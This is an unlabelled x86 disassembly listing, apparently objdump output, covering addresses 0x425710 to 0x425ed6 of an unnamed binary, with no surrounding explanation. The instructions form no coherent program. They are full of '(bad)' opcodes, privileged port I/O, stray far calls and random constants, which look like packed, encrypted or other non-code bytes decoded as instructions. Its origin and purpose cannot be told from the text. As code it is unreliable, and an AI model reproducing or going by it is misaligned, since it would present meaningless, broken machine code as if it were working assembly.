  425710:	sti    
  425711:	and    ch,dh
  425713:	inc    ecx
  425714:	or     DWORD PTR ds:0x96df096,ebx
  42571a:	fwait
  42571b:	push   edi
  42571c:	mov    ebp,0x30899c27
  425721:	es enter 0xe604,0x49
  425726:	pop    es
  425727:	jg     0x425704
  425729:	lea    esp,[eax+0x6f63ecdc]
  42572f:	mov    dh,0xb3
  425732:	pop    ebx
  425733:	push   cs
  425734:	pop    edx
  425735:	sub    al,BYTE PTR [ebx+0x49680dd6]
  42573b:	pop    esi
  42573c:	push   edx
  42573d:	std    
  42573e:	and    dl,BYTE PTR [edx-0x10b9e28f]
  425744:	je     0x425780
  425746:	stos   BYTE PTR es:[edi],al
  425747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425748:	or     BYTE PTR [edx-0x51512a8b],ch
  42574e:	scas   eax,DWORD PTR es:[edi]
  42574f:	sbb    ecx,eax
  425751:	jb     0x425706
  425753:	mov    DWORD PTR [ecx+0x22],edi
  425756:	test   DWORD PTR [edi+0x66fc1d3b],edx
  42575c:	mov    ebx,DWORD PTR ds:[ebx-0x446a1478]
  425763:	cmp    eax,0x1fe30c12
  425768:	jb     0x42576f
  42576a:	in     al,dx
  42576b:	mov    edi,0x3f0785b1
  425770:	mov    bl,0x13
  425772:	icebp  
  425773:	mov    bl,bl
  425775:	push   ebx
  425776:	sbb    BYTE PTR [eax+0x14c21759],al
  42577c:	cmp    bl,BYTE PTR [edx]
  42577e:	add    DWORD PTR [eax-0x160b3e64],ebx
  425784:	dec    edx
  425785:	(bad)  
  425786:	(bad)  
  425787:	pushf  
  425788:	mov    DWORD PTR [eax],0x1145caee
  42578e:	test   al,0x3a
  425790:	js     0x4257d9
  425792:	data16 adc al,0x97
  425795:	xchg   esp,eax
  425796:	mov    eax,ds:0x21dcba8f
  42579b:	jb     0x425743
  42579d:	ss jne 0x425733
  4257a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257a1:	push   0x55
  4257a3:	scas   eax,DWORD PTR es:[edi]
  4257a4:	mov    WORD PTR [edx+0x7ddca69f],gs
  4257aa:	sub    dl,BYTE PTR [ebx-0x70fc5ab1]
  4257b0:	push   ecx
  4257b1:	(bad)  
  4257b2:	aas    
  4257b3:	pushf  
  4257b4:	mov    ah,0x50
  4257b6:	(bad)  [ebx+eiz*2-0x58f0a921]
  4257bd:	data16 daa 
  4257bf:	jo     0x42579d
  4257c1:	push   ecx
  4257c2:	outs   dx,BYTE PTR ds:[esi]
  4257c3:	adc    bl,BYTE PTR [ebx]
  4257c5:	jns    0x425789
  4257c7:	mov    ds:0x76328d93,eax
  4257cc:	push   ecx
  4257cd:	jl     0x4257c3
  4257cf:	enter  0x9438,0x1d
  4257d3:	inc    eax
  4257d4:	sbb    DWORD PTR [edx-0x21e53a56],eax
  4257da:	dec    ebx
  4257db:	mov    ebp,0x606b5da2
  4257e0:	mov    ah,0xdd
  4257e2:	(bad)  
  4257e3:	jl     0x42582d
  4257e5:	jne    0x425863
  4257e7:	in     eax,0xe1
  4257e9:	cwde   
  4257ea:	int    0x61
  4257ec:	call   0xc78f:0xbe7eaf30
  4257f3:	enter  0x1e00,0x25
  4257f7:	add    edx,DWORD PTR [eax]
  4257f9:	and    esp,DWORD PTR [eax+0x7c2a9dc0]
  4257ff:	mov    edi,DWORD PTR [eax+0x3798f970]
  425805:	aaa    
  425806:	test   eax,0xb412638e
  42580b:	dec    eax
  42580c:	inc    edx
  42580d:	shl    DWORD PTR [eax+0x66],cl
  425810:	fimul  DWORD PTR [edx]
  425812:	inc    esp
  425813:	fist   WORD PTR [edi-0x29]
  425816:	mov    esp,DWORD PTR [edx+0x67]
  425819:	adc    BYTE PTR [eax+0x1a6c4619],dl
  42581f:	ror    esp,cl
  425821:	test   al,0x40
  425823:	xor    edx,esp
  425825:	(bad)  
  425826:	xor    al,BYTE PTR fs:[eax+0x3293c6ef]
  42582d:	bound  esp,QWORD PTR [edx-0x7f]
  425830:	aaa    
  425831:	mov    esp,edx
  425833:	inc    esp
  425834:	addr16 cmp eax,0x26b83cec
  42583a:	loop   0x425854
  42583c:	into   
  42583d:	jmp    0xee49:0xcc9bef93
  425844:	addr16 jp 0x425863
  425847:	(bad)  
  425849:	mov    ds:0x9a598511,eax
  42584e:	int3   
  42584f:	(bad)  
  425851:	and    eax,DWORD PTR [esi]
  425853:	int    0x30
  425855:	push   edx
  425856:	shl    DWORD PTR [esi-0x5f],cl
  425859:	ds xchg ebx,eax
  42585b:	shl    cl,1
  42585d:	pushf  
  42585e:	ja     0x4258be
  425860:	aam    0x43
  425862:	test   eax,0x43da6f00
  425867:	or     DWORD PTR [edx+0x46],ecx
  42586a:	(bad)  
  42586b:	in     eax,0x64
  42586d:	push   ss
  42586e:	lahf   
  42586f:	sub    BYTE PTR [esi],dh
  425871:	mov    al,0x5a
  425873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425874:	push   eax
  425875:	cwde   
  425876:	aas    
  425877:	shl    BYTE PTR [ebx],0x52
  42587a:	(bad)  
  42587b:	retf   0xaad2
  42587e:	dec    esi
  42587f:	adc    edi,DWORD PTR [edi+0x8f6b08e]
  425885:	aad    0xc7
  425887:	xchg   ebp,eax
  425888:	mov    al,ds:0xb94a6585
  42588d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42588e:	mov    dh,0xea
  425890:	into   
  425891:	inc    esp
  425892:	call   0x5a825446
  425897:	cmp    ch,BYTE PTR [edx]
  425899:	je     0x425827
  42589b:	test   BYTE PTR [edi+0x6aafe841],bh
  4258a1:	inc    ebx
  4258a2:	push   ss
  4258a3:	sub    ebp,DWORD PTR [ebp+0x5d]
  4258a6:	sub    eax,0xc35100e9
  4258ab:	cmp    DWORD PTR [edx+eax*1+0x27],0xe5f81bd6
  4258b3:	add    esi,DWORD PTR [ecx-0x14]
  4258b6:	cdq    
  4258b7:	or     al,0xe1
  4258b9:	loopne 0x42590e
  4258bb:	add    eax,0xd5c96d7c
  4258c0:	sub    cl,dh
  4258c2:	mov    WORD PTR [edi-0x4],es
  4258c5:	adc    bl,BYTE PTR [eax]
  4258c7:	push   ebx
  4258c8:	repz mov dl,al
  4258cb:	hlt    
  4258cc:	(bad)  
  4258ce:	xchg   esi,edx
  4258d0:	int    0x4c
  4258d2:	xchg   ecx,eax
  4258d3:	xchg   esi,eax
  4258d4:	mul    DWORD PTR [ebx-0x10]
  4258d7:	in     eax,dx
  4258d8:	push   es
  4258d9:	push   0x1f
  4258db:	inc    ebp
  4258dc:	adc    eax,0x128d0f12
  4258e1:	xchg   esi,eax
  4258e2:	or     eax,edi
  4258e4:	xor    esi,DWORD PTR ss:0x91786bf7
  4258eb:	pop    ebx
  4258ec:	test   eax,0xfb666703
  4258f1:	cmp    BYTE PTR [ebp+0x64d3c518],dl
  4258f7:	push   0xc6c2d497
  4258fc:	jecxz  0x4258f6
  4258fe:	(bad)  
  4258ff:	push   0x3
  425901:	repz jmp 0xaf11af1f
  425907:	arpl   WORD PTR [ecx-0x4e7e0dd6],cx
  42590d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42590e:	outs   dx,BYTE PTR ds:[esi]
  42590f:	xor    esi,ebx
  425911:	loope  0x4258ac
  425913:	cs test eax,0x10f1d8ae
  425919:	pop    esi
  42591a:	pop    eax
  42591b:	sub    ebx,ebp
  42591d:	test   BYTE PTR [eax-0x727fddcf],ah
  425923:	outs   dx,BYTE PTR ds:[esi]
  425924:	pop    es
  425925:	sbb    DWORD PTR [esi],edi
  425927:	out    0x79,eax
  425929:	(bad)  
  42592a:	das    
  42592b:	jb     0x42595d
  42592d:	inc    edi
  42592e:	dec    ebx
  42592f:	add    DWORD PTR [eax+ebp*1+0x64],esi
  425933:	jae    0x4258c6
  425935:	sub    BYTE PTR [esi+0x63c75e92],bh
  42593b:	out    0x9a,eax
  42593d:	fild   DWORD PTR [esi]
  42593f:	dec    edi
  425940:	mov    bl,0x32
  425942:	mov    ah,0x44
  425944:	(bad)  
  425945:	call   0xf7b7:0x3e820f71
  42594c:	ror    DWORD PTR [eax*1+0x69a75f16],1
  425953:	add    ebx,DWORD PTR [eax-0x110cc9cb]
  425959:	stc    
  42595a:	cmp    ah,ch
  42595c:	lods   eax,DWORD PTR ds:[esi]
  42595d:	push   ss
  42595e:	jle    0x425983
  425960:	aaa    
  425961:	xchg   DWORD PTR [edi+0x143f9594],edx
  425967:	inc    edx
  425968:	mov    ds,WORD PTR [eax+ebx*2-0x45c9967b]
  42596f:	stos   BYTE PTR es:[edi],al
  425970:	scas   eax,DWORD PTR es:[edi]
  425971:	popf   
  425972:	mov    ds:0x118c578b,eax
  425977:	ret    0x3f29
  42597a:	out    dx,eax
  42597b:	inc    edx
  42597c:	inc    ebp
  42597d:	mov    ch,0x32
  42597f:	jb     0x4259f2
  425981:	sub    esp,DWORD PTR [edi]
  425983:	mov    eax,0x54e16c54
  425988:	rol    edx,cl
  42598a:	shl    DWORD PTR [esi+edx*1+0x64],0xe4
  42598f:	cwde   
  425990:	in     eax,0x86
  425992:	stos   BYTE PTR es:[edi],al
  425993:	jb     0x425964
  425995:	das    
  425996:	push   ebp
  425997:	pop    ebx
  425998:	call   0x1130e7d6
  42599d:	xor    al,0x66
  42599f:	mov    ebx,0xb0b246a8
  4259a4:	mov    edx,0x9dbd6e83
  4259a9:	push   0xd
  4259ab:	aas    
  4259ac:	fsubr  QWORD PTR [ebx-0x7d4c80a0]
  4259b2:	lea    esi,[eax+0xc]
  4259b5:	(bad)  
  4259b7:	and    al,0xe6
  4259b9:	mov    eax,0x1b6a91fa
  4259be:	jg     0x425a17
  4259c0:	push   0x3470dd52
  4259c5:	mov    bh,0x93
  4259c7:	or     al,0x40
  4259c9:	popa   
  4259ca:	add    BYTE PTR ds:0x3971fef8,bh
  4259d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259d1:	repnz pop edx
  4259d3:	ss push ebx
  4259d5:	cmp    BYTE PTR [edi-0x55ec944],bh
  4259db:	mov    al,0x4f
  4259dd:	pop    eax
  4259de:	fadd   QWORD PTR [esi-0x4e]
  4259e1:	loope  0x425a09
  4259e3:	adc    al,0x96
  4259e5:	out    dx,eax
  4259e6:	ja     0x42596f
  4259e8:	jle    0x425a21
  4259ea:	pushf  
  4259eb:	push   esp
  4259ec:	arpl   WORD PTR [esi-0x1c],dx
  4259ef:	xor    ebp,ebx
  4259f1:	push   0x72
  4259f3:	sub    eax,0xf2914021
  4259f8:	pushw  es
  4259fa:	sahf   
  4259fb:	dec    eax
  4259fc:	and    esp,DWORD PTR [ecx+0x3a]
  4259ff:	ror    BYTE PTR [esi+0x44],0x60
  425a03:	xchg   bh,ah
  425a05:	dec    edx
  425a06:	lods   al,BYTE PTR ds:[esi]
  425a07:	jnp    0x425a25
  425a09:	cmp    ebp,DWORD PTR [ebp+0x19]
  425a0c:	ins    DWORD PTR es:[edi],dx
  425a0d:	adc    ecx,0xffffff88
  425a10:	mov    ah,BYTE PTR [ecx]
  425a12:	jmp    0x425a76
  425a14:	sbb    esi,edi
  425a16:	adc    DWORD PTR [esi+0x24],eax
  425a19:	fld    DWORD PTR [ecx-0x49e7961e]
  425a1f:	xchg   edx,eax
  425a20:	retf   
  425a21:	pop    esp
  425a22:	and    al,0x58
  425a24:	dec    ecx
  425a25:	hlt    
  425a26:	pusha  
  425a27:	mov    DWORD PTR [esp+edx*2],eax
  425a2a:	ret    0x2ae3
  425a2d:	ds push esp
  425a2f:	cmp    ebp,DWORD PTR [esi+0x36df08c7]
  425a35:	dec    eax
  425a36:	and    bl,BYTE PTR [edi-0x16]
  425a39:	xchg   ebp,eax
  425a3a:	icebp  
  425a3b:	in     eax,dx
  425a3c:	push   edx
  425a3d:	adc    bh,dl
  425a3f:	in     eax,dx
  425a40:	mov    ecx,0x2c6d912
  425a45:	mov    esi,0x9dc458b9
  425a4a:	adc    eax,DWORD PTR [ebp+esi*2-0x56]
  425a4e:	adc    eax,0x4784267b
  425a53:	or     DWORD PTR [ecx-0x2a22faab],edx
  425a59:	mov    esi,0xc09fa94d
  425a5e:	cdq    
  425a5f:	lods   eax,DWORD PTR ds:[esi]
  425a60:	or     dl,ch
  425a62:	mov    esi,0xae932e90
  425a67:	stos   BYTE PTR es:[edi],al
  425a68:	dec    esp
  425a69:	lods   eax,DWORD PTR ds:[esi]
  425a6a:	aaa    
  425a6b:	pop    ebp
  425a6c:	push   ds
  425a6d:	jp     0x425a7a
  425a6f:	in     eax,dx
  425a70:	jp     0x425a8d
  425a72:	xchg   edi,eax
  425a73:	jmp    0x425ad2
  425a75:	dec    esp
  425a76:	inc    esi
  425a77:	cmp    DWORD PTR [eax-0x1874d58d],0xffffffd6
  425a7e:	jmp    0x425af8
  425a80:	jecxz  0x425ade
  425a82:	add    al,0x37
  425a84:	out    dx,eax
  425a85:	or     ah,bl
  425a87:	enter  0x45e3,0x4a
  425a8b:	pop    eax
  425a8c:	pop    ss
  425a8d:	fcomip st,st(5)
  425a8f:	or     BYTE PTR [edx-0x23],ah
  425a92:	pusha  
  425a93:	add    BYTE PTR [edx+0x530c222b],dl
  425a99:	(bad)  
  425a9a:	in     al,0x87
  425a9c:	mov    ebx,DWORD PTR [edi-0x4d245e68]
  425aa2:	mov    esi,0xf09a8f6a
  425aa7:	in     eax,dx
  425aa8:	add    eax,0xf511e9e2
  425aad:	inc    edi
  425aae:	xor    DWORD PTR [edi-0x17cf03f4],edi
  425ab4:	inc    ebx
  425ab5:	cld    
  425ab6:	lock outs dx,BYTE PTR ds:[esi]
  425ab8:	mov    al,cs:0x6382307b
  425abe:	mov    DWORD PTR [esi+ebx*4],esi
  425ac1:	das    
  425ac2:	sub    dl,ch
  425ac4:	cmp    BYTE PTR [ebx+esi*1-0x5381df23],al
  425acb:	push   eax
  425acc:	lds    ebp,FWORD PTR [ebp+0x5b]
  425acf:	xor    eax,0xf802b19c
  425ad4:	stc    
  425ad5:	cwde   
  425ad6:	(bad)  
  425ad7:	leave  
  425ad8:	jmp    0xc20d82e
  425add:	and    al,0xea
  425adf:	cmp    BYTE PTR [ebp-0x7e],dl
  425ae2:	push   ss
  425ae3:	out    0xa6,eax
  425ae5:	jmp    0xd858:0xa160aa5b
  425aec:	ret    0x95f3
  425aef:	cmp    dl,BYTE PTR [edx]
  425af1:	(bad)  
  425af2:	mov    al,ds:0xcb7fc6cf
  425af7:	(bad)  
  425af8:	jno    0x425b45
  425afa:	and    BYTE PTR [ecx+0x24],al
  425afd:	adc    al,0xc5
  425aff:	(bad)  
  425b01:	xlat   BYTE PTR ds:[ebx]
  425b02:	mov    al,0xf6
  425b04:	pop    esp
  425b05:	add    DWORD PTR [edi-0x29],esp
  425b08:	fcmovu st,st(3)
  425b0a:	xor    eax,0xa03ea421
  425b0f:	sbb    DWORD PTR [esp],eax
  425b12:	test   al,0x72
  425b14:	pop    es
  425b15:	loope  0x425ae2
  425b17:	cdq    
  425b18:	mov    ch,0xd
  425b1a:	cmc    
  425b1b:	(bad)  
  425b1c:	or     al,0x76
  425b1e:	xor    BYTE PTR [ebp+0x0],dl
  425b21:	icebp  
  425b22:	add    al,BYTE PTR [esi+esi*2+0x5c8871c7]
  425b29:	cld    
  425b2a:	dec    ebx
  425b2b:	mov    ebx,0xf55be376
  425b30:	and    BYTE PTR [ecx],cl
  425b32:	xchg   ebp,eax
  425b33:	sar    BYTE PTR [eax-0x4d813d2b],cl
  425b39:	gs xchg edi,eax
  425b3b:	fwait
  425b3c:	push   0xd75a5a75
  425b41:	out    dx,eax
  425b42:	add    al,0x2c
  425b44:	je     0x425b8e
  425b46:	pushf  
  425b47:	sub    DWORD PTR [ebp+0x1d],edx
  425b4a:	mov    BYTE PTR [ecx+eax*2-0x69],cl
  425b4e:	not    BYTE PTR [esi-0x23]
  425b51:	push   eax
  425b52:	leave  
  425b53:	loope  0x425b33
  425b55:	xchg   ebx,eax
  425b56:	jbe    0x425b08
  425b58:	push   ss
  425b59:	iret   
  425b5a:	loopne 0x425bc8
  425b5c:	iret   
  425b5d:	inc    esi
  425b5e:	aam    0xe
  425b60:	mov    ds:0x89e2acd2,al
  425b65:	mov    ch,0x2e
  425b67:	xor    bl,BYTE PTR [ecx-0x7414ebb7]
  425b6d:	push   0x72c8f384
  425b72:	mov    bh,0x9b
  425b74:	dec    esi
  425b75:	pop    ss
  425b76:	aas    
  425b77:	inc    eax
  425b78:	leave  
  425b79:	jo     0x425b33
  425b7b:	push   ecx
  425b7c:	ret    0xd59c
  425b7f:	cmp    BYTE PTR [ebp+0x64],0xe
  425b83:	jae    0x425bb0
  425b85:	jmp    0x425b4f
  425b87:	das    
  425b88:	push   es
  425b89:	mov    ah,0x91
  425b8b:	icebp  
  425b8c:	mov    esi,0x95563aad
  425b91:	mov    cl,0x11
  425b93:	jle    0x425b7a
  425b95:	xchg   edi,eax
  425b96:	stos   BYTE PTR es:[edi],al
  425b97:	not    DWORD PTR [eax+0x13]
  425b9a:	stos   BYTE PTR es:[edi],al
  425b9b:	movups XMMWORD PTR [ebx+0x213148],xmm6
  425ba2:	rcr    DWORD PTR [edi+0x3f],cl
  425ba5:	sbb    al,0x28
  425ba7:	fs xchg al,ch
  425baa:	mov    ah,cl
  425bac:	dec    esp
  425bad:	ins    DWORD PTR es:[edi],dx
  425bae:	jp     0x425bb3
  425bb0:	jle    0x425b4a
  425bb2:	test   al,0x48
  425bb4:	imul   eax,eax,0x37
  425bb7:	and    BYTE PTR [ecx-0x28e511bc],cl
  425bbd:	imul   eax,ebx,0xce19ea0f
  425bc3:	and    eax,0x740b30
  425bc8:	mov    esi,0xd9ba622a
  425bcd:	add    al,0x75
  425bcf:	enter  0x4d38,0x6f
  425bd3:	test   DWORD PTR [eax+0x6b],ecx
  425bd6:	mov    bl,0xb8
  425bd8:	xchg   DWORD PTR [eax],edx
  425bda:	imul   edx,DWORD PTR [esi+edi*2],0xffffffe9
  425bde:	xor    edx,DWORD PTR [ecx+0x7]
  425be1:	and    al,BYTE PTR [esi]
  425be3:	and    esi,DWORD PTR [eax-0x1f]
  425be6:	xlat   BYTE PTR ds:[ebx]
  425be7:	cmp    esi,DWORD PTR [eax]
  425be9:	sub    eax,0x68aa66e1
  425bee:	adc    BYTE PTR [ebx],bh
  425bf0:	popa   
  425bf1:	scas   eax,DWORD PTR es:[edi]
  425bf2:	cdq    
  425bf3:	or     ch,dl
  425bf5:	test   DWORD PTR [edi],ebx
  425bf7:	aas    
  425bf8:	das    
  425bf9:	mov    cl,0x23
  425bfb:	xchg   edx,eax
  425bfc:	sub    al,0x23
  425bfe:	scas   al,BYTE PTR es:[edi]
  425bff:	arpl   WORD PTR ds:0xa0ae4408,bx
  425c05:	ret    0x955e
  425c08:	cmp    edi,DWORD PTR [eax+0x71]
  425c0b:	mov    eax,ds:0xc4569f85
  425c10:	adc    DWORD PTR [ebx+0x38384853],ecx
  425c16:	ret    0xafc3
  425c19:	cmp    ah,BYTE PTR [ecx]
  425c1b:	xchg   ebp,eax
  425c1c:	adc    al,BYTE PTR [ecx-0x64]
  425c1f:	stos   BYTE PTR es:[edi],al
  425c20:	je     0x425c12
  425c22:	fsub   QWORD PTR [esi+0x7]
  425c25:	xlat   BYTE PTR ds:[ebx]
  425c26:	in     al,0x88
  425c28:	add    dl,bl
  425c2a:	and    ebp,eax
  425c2c:	push   ecx
  425c2d:	gs test al,0x55
  425c30:	dec    ebx
  425c31:	fsubr  st,st(4)
  425c33:	mov    eax,0xeaa601da
  425c38:	dec    esi
  425c39:	push   ss
  425c3a:	pop    ebx
  425c3b:	pop    ebp
  425c3c:	pop    ebp
  425c3d:	sub    bh,BYTE PTR [esi-0x5b2aaf2a]
  425c43:	pop    esp
  425c44:	adc    al,0x5c
  425c46:	or     ebp,DWORD PTR [edi+0x6a5910a4]
  425c4c:	jbe    0x425cbf
  425c4e:	in     eax,dx
  425c4f:	pop    eax
  425c50:	add    al,0xef
  425c52:	mov    ebp,0xf038d2d
  425c57:	lods   eax,DWORD PTR ds:[esi]
  425c58:	loopne 0x425c2c
  425c5a:	(bad)  
  425c5b:	mov    al,ds:0xc38280f6
  425c60:	imul   eax,esi,0x43
  425c63:	test   BYTE PTR [ebx-0x3b],al
  425c66:	pop    eax
  425c67:	add    eax,edi
  425c69:	pop    eax
  425c6a:	dec    edi
  425c6b:	pop    ecx
  425c6c:	mov    edi,0x8cd93d61
  425c71:	aam    0x6c
  425c73:	sbb    ebx,ebp
  425c75:	xchg   esi,eax
  425c76:	lock mov esi,0x625b4923
  425c7c:	(bad)  
  425c7d:	fsub   st,st(3)
  425c7f:	ins    DWORD PTR es:[edi],dx
  425c80:	(bad)  
  425c81:	das    
  425c82:	repnz int 0xc0
  425c85:	adc    eax,0x4fd0bc11
  425c8a:	jecxz  0x425c1d
  425c8c:	jb     0x425c9d
  425c8e:	(bad)  
  425c8f:	adc    esi,ecx
  425c91:	(bad)  
  425c92:	ficom  DWORD PTR [edx+0x11]
  425c95:	shl    ebp,cl
  425c97:	es xchg edx,eax
  425c99:	mov    esp,0xbea47df9
  425c9e:	scas   eax,DWORD PTR es:[edi]
  425c9f:	xchg   ecx,eax
  425ca0:	mov    ecx,0x8f22655
  425ca5:	nop
  425ca6:	ds cli 
  425ca8:	jl     0x425c52
  425caa:	hlt    
  425cab:	cli    
  425cac:	mov    al,0xd3
  425cae:	xlat   BYTE PTR ds:[ebx]
  425caf:	cmp    eax,0x7040540f
  425cb4:	(bad)  
  425cb5:	shl    BYTE PTR [edi+0x65e1a8d5],1
  425cbb:	xchg   ebp,eax
  425cbc:	push   es
  425cbd:	out    dx,al
  425cbe:	sbb    eax,0x9d9de2c9
  425cc3:	adc    ah,BYTE PTR ds:[ecx+ebp*1+0x33f2bfd5]
  425ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ccc:	popf   
  425ccd:	mov    ch,0x5e
  425ccf:	sbb    esp,DWORD PTR [edi]
  425cd1:	stos   BYTE PTR es:[edi],al
  425cd2:	fsubr  DWORD PTR [esi+0x3de2b80d]
  425cd8:	stos   DWORD PTR es:[edi],eax
  425cd9:	cmp    eax,0x6660f293
  425cde:	cli    
  425cdf:	mov    ebx,0x56da55e9
  425ce4:	add    DWORD PTR [edx+ebx*2+0x49],eax
  425ce8:	mov    al,0x83
  425cea:	adc    al,0x45
  425cec:	sbb    bl,al
  425cee:	dec    esi
  425cef:	adc    eax,0x669d4120
  425cf4:	sahf   
  425cf5:	cli    
  425cf6:	dec    edx
  425cf7:	sub    eax,0xc40f8b31
  425cfc:	mov    ds:0xd55fef3a,eax
  425d01:	std    
  425d02:	push   ebx
  425d03:	mov    WORD PTR [eax-0x55],fs
  425d06:	fld    st(0)
  425d08:	cmp    BYTE PTR [edi+0x68],dl
  425d0b:	push   ebx
  425d0c:	in     eax,0xee
  425d0e:	push   ebx
  425d0f:	dec    edi
  425d11:	test   DWORD PTR [edx+0x38],edi
  425d14:	dec    ebx
  425d15:	sbb    BYTE PTR [edi+0x2610858f],0x52
  425d1c:	enter  0xe212,0xe5
  425d20:	sub    eax,0x9c8b2707
  425d25:	jl     0x425d51
  425d27:	xor    BYTE PTR [ebx-0x13],0x8
  425d2b:	out    dx,al
  425d2c:	cwde   
  425d2d:	into   
  425d2e:	popa   
  425d2f:	mov    ds:0xb5e389b0,eax
  425d34:	or     dl,dl
  425d36:	fst    DWORD PTR [ecx-0x64]
  425d39:	mov    ecx,0xfca91e74
  425d3e:	mov    BYTE PTR [esi+0x22],ah
  425d41:	test   eax,0xf2861108
  425d46:	adc    al,0xb4
  425d48:	retf   0xb6b8
  425d4b:	xlat   BYTE PTR ds:[ebx]
  425d4c:	shr    BYTE PTR [ebx],0x52
  425d4f:	jge    0x425dbe
  425d51:	xor    eax,0x78e256cd
  425d56:	mov    ds:0x56fce16f,al
  425d5b:	jne    0x425d38
  425d5d:	loopne 0x425d00
  425d5f:	sahf   
  425d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d61:	or     BYTE PTR [esi+0x2b8702b8],al
  425d67:	test   BYTE PTR [edx],0xd7
  425d6a:	aaa    
  425d6b:	mov    eax,ds:0x493c40b1
  425d70:	add    esi,DWORD PTR [esi]
  425d72:	add    esi,DWORD PTR [edi-0x7c]
  425d75:	mov    al,ds:0xcc410e4
  425d7a:	add    dl,BYTE PTR ds:0xc4e8bc9f
  425d80:	ret    
  425d81:	and    eax,0xd13f01d5
  425d86:	(bad)  
  425d87:	xchg   esp,eax
  425d88:	sub    al,dl
  425d8a:	mov    ebp,ecx
  425d8c:	in     al,dx
  425d8d:	dec    ebx
  425d8e:	sbb    DWORD PTR [ebx-0x1c93d828],ebp
  425d94:	mul    DWORD PTR [esi-0x1e]
  425d97:	dec    esi
  425d98:	adc    edi,DWORD PTR [esi+0x4af4de65]
  425d9e:	cwde   
  425d9f:	test   BYTE PTR ds:0x8d857a53,0x31
  425da6:	cdq    
  425da7:	or     DWORD PTR [edi],ebp
  425da9:	push   cs
  425daa:	jbe    0x425e26
  425dac:	inc    ebp
  425dad:	fs into 
  425daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425db0:	sub    dl,bl
  425db2:	aaa    
  425db3:	out    dx,al
  425db4:	popa   
  425db5:	inc    si
  425db7:	call   0x622b:0x3bdb492a
  425dbe:	cmp    BYTE PTR [esi+0x1f71406c],dl
  425dc4:	sub    edx,DWORD PTR [edi]
  425dc6:	mov    al,ds:0xda6f85d2
  425dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dcc:	and    bh,dh
  425dce:	ret    0x79b0
  425dd1:	push   ds
  425dd2:	call   0xaef7:0xccde2e2b
  425dd9:	out    0x45,eax
  425ddb:	out    dx,al
  425ddc:	fcomp  QWORD PTR [ebx-0x5d11aa7e]
  425de2:	xchg   ebp,eax
  425de3:	mov    ch,0x71
  425de5:	cmp    BYTE PTR [edx],0xfd
  425de8:	ret    
  425de9:	fwait
  425dea:	dec    ebp
  425deb:	in     eax,dx
  425dec:	cmp    bh,BYTE PTR [ebx]
  425dee:	xor    al,0x3f
  425df0:	mov    ds,WORD PTR [eax]
  425df2:	sbb    esp,eax
  425df4:	dec    edx
  425df5:	mov    ch,0x4c
  425df7:	pop    eax
  425df8:	pushf  
  425df9:	inc    esp
  425dfa:	mov    ebp,0x76eb8751
  425dff:	xor    al,0x4e
  425e01:	ins    DWORD PTR es:[edi],dx
  425e02:	adc    BYTE PTR ds:0x8572b2a8,bl
  425e08:	popw   es
  425e0a:	in     eax,0x46
  425e0c:	pop    edi
  425e0d:	xlat   BYTE PTR ds:[ebx]
  425e0e:	lahf   
  425e0f:	mov    BYTE PTR [eax-0x6a77dbcf],dl
  425e15:	outs   dx,DWORD PTR ds:[esi]
  425e16:	sahf   
  425e17:	dec    esi
  425e18:	loopne 0x425dc1
  425e1a:	push   cs
  425e1b:	and    al,0x70
  425e1d:	retf   
  425e1e:	mov    DWORD PTR [ebp-0x24],esi
  425e21:	push   edi
  425e22:	sbb    al,ch
  425e24:	ret    
  425e25:	push   edx
  425e26:	sbb    BYTE PTR [esi+0x49],al
  425e29:	ret    
  425e2a:	and    eax,0x756189f8
  425e2f:	clc    
  425e30:	sub    ah,BYTE PTR [eax-0x65f5377c]
  425e36:	xor    ch,bl
  425e38:	and    eax,0xe6dce198
  425e3d:	cdq    
  425e3e:	adc    DWORD PTR [edi+edx*4+0x79cefef3],esi
  425e45:	out    0x43,eax
  425e47:	ror    ebx,1
  425e49:	mov    esp,0x7e51ef37
  425e4e:	loope  0x425e57
  425e50:	jns    0x425e52
  425e52:	repnz adc esi,DWORD PTR [esi]
  425e55:	(bad)  
  425e56:	xor    bh,BYTE PTR [edx]
  425e58:	adc    BYTE PTR [edi],0x88
  425e5b:	outs   dx,BYTE PTR ds:[esi]
  425e5c:	jle    0x425ed9
  425e5e:	test   eax,0xaea419a0
  425e63:	or     BYTE PTR [edx+eiz*2-0x1],al
  425e67:	imul   edx,DWORD PTR ds:0x238d90f7,0x76eb4a9c
  425e71:	loope  0x425eb4
  425e73:	aad    0xd1
  425e75:	cwde   
  425e76:	repz mov esi,DWORD PTR [eax+0x3e]
  425e7a:	imul   esp,DWORD PTR [ebp+0x38449216],0x2a
  425e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e82:	push   di
  425e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e85:	xchg   BYTE PTR [edx+0x2a],ch
  425e88:	xchg   BYTE PTR [ebx-0x683f6552],ch
  425e8e:	mov    gs,WORD PTR [edi-0x22bede]
  425e94:	lahf   
  425e95:	ret    
  425e96:	and    eax,0x2aa2af4
  425e9b:	xchg   edi,eax
  425e9c:	outs   dx,DWORD PTR ds:[esi]
  425e9d:	adc    al,0x57
  425e9f:	test   BYTE PTR [edi+0x2],bh
  425ea2:	jle    0x425e88
  425ea4:	lahf   
  425ea5:	rol    BYTE PTR [edx+0x561ae369],1
  425eab:	ja     0x425e61
  425ead:	or     ah,al
  425eaf:	std    
  425eb0:	lods   eax,DWORD PTR ds:[esi]
  425eb1:	pop    ss
  425eb2:	inc    edx
  425eb3:	inc    edx
  425eb4:	sbb    eax,DWORD PTR [ebp-0x59]
  425eb7:	xor    edi,DWORD PTR [ebx-0x43]
  425eba:	sbb    eax,0xb52367dd
  425ebf:	(bad)  
  425ec0:	shl    DWORD PTR [ebp+0x77fe18f0],0x34
  425ec7:	mov    bl,BYTE PTR [ebx]
  425ec9:	xor    bh,BYTE PTR es:[eax+0x12d259b8]
  425ed0:	cmp    esi,esp
  425ed2:	xor    al,0x31
  425ed4:	sbb    bl,BYTE PTR [ebx]
  425ed6:	aam    0x6f
